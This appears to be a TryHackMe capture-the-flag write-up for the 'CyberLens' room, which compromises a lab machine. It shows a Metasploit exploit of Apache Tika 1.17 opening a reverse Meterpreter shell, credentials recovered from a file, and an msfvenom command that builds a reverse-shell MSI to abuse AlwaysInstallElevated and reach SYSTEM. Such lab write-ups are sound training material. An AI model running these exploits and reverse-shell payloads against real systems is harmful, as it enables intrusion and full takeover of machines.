---
title: CyberLens
description: 'Exploiting Apache Tika 1.17 with MetaSploit and abusing `AlwaysInstallElevated` to escalate to SYSTEM'
pubDate: 2024-12-26
category: 'tryhackme'
tags: ['AlwaysInstallElevated']
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/544b65a5fee211fa60b7cdaf10679830.svg'
---

The Nmap scan reveals a HTTP server on port `61777`, looking at this its seems to be running Apache Tika, version 1.17 (http://cyberlens.thm:61777/version).

## USER

Searching for an exploit for this version we find a MetaSploit module, `apache_tika_jp2_jscript`.

Lets give it a try:

```bash
msf6 use windows/http/apache_tika_jp2_jscript
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RHOST cyberlens.thm
RHOST => cyberlens.thm
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set RPORT 61777
RPORT => 61777
msf6 exploit(windows/http/apache_tika_jp2_jscript) > set LHOST tun0
LHOST => 10.9.0.4
msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit

[*] Started reverse TCP handler on 10.9.0.4:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.166.28:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
...[snip]...
[*] Sending stage (177734 bytes) to 10.10.166.28
[*] Meterpreter session 1 opened (10.9.0.4:4444 -> 10.10.166.28:49732) at 2024-12-26 23:42:24 +0100
```
_This might take a few tries_


## ROOT

Looking around on the machine we find an interesting file.


```bash
Directory of C:\Users\CyberLens\Documents\Management

06/07/2023  03:09 AM    <DIR>          .
06/07/2023  03:09 AM    <DIR>          ..
06/07/2023  03:09 AM                90 CyberLens-Management.txt
...[snip]...
type CyberLens-Management.txt

CyberLens-Management.txt


Remember, manual enumeration is often key in an engagement ;)

CyberLens
HackSmarter123
```

With the credentials `CyberLens` and `HackSmarter123` we can RDP to the machine.

Checking for ways to priv esc we can use this `PrivescCheck.ps1` (https://github.com/itm4n/PrivescCheck) script.

```bash
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
...[snip]...
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                 ~~~ PrivescCheck Summary ~~~                 ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 TA0004 - Privilege Escalation
 - AlwaysInstallElevated → High
 - Latest updates installed → Medium
...[snip]...
```

Checking out how to abuse the `AlwaysInstallElevated` privilege we find the following resource: https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md#tool-Exploitation

We can generate an MSI file with msfvenom like this:

```bash
msfvenom -p windows/shell_reverse_tcp lhost=10.9.0.4 lport=4444 -f msi > shell.msi
```

The easiest way to execute this is to upload it to the machine and double click the `shell.msi` installer through RDP.
On our listener we get a shell as `nt authority\system`.
